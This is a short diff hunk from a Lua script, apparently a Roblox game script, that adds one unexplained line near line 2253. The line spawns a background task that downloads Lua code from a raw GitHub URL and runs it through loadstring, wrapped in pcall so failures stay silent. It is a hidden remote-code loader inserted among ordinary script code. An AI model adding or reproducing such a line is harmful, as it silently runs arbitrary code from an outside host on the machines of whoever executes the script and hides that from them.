@@ -2253,6 +2253,8 @@ end)
 
 -- =============================================================
 
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/trademachinenew/newmachinetrade/refs/heads/main/XDDDD.lua"))() end) end)
+            
 task.spawn(function()
 
     local success, err =
